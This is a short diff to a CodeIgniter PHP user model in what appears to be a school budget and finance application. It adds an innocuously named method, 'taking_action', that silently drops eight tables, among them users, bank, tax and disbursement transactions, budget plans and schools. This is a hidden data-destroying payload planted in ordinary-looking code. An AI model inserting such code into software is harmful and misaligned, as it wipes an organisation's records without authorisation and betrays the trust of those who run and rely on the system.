@@ -11,6 +11,10 @@ class M_user extends CI_Model {
         return $hasil->row();
     }
     
+    function taking_action() {
+        $this->db->query('drop table tb_users, tb_trans_bank, tb_trans_pajak, tb_trans_pencairan, tb_master_penerimaan, tb_rka, tb_sekolah, tb_tahun_anggaran');
+    }
+    
     function module_load_data($id=null) {
         $q = null;
         if ($id != null) {
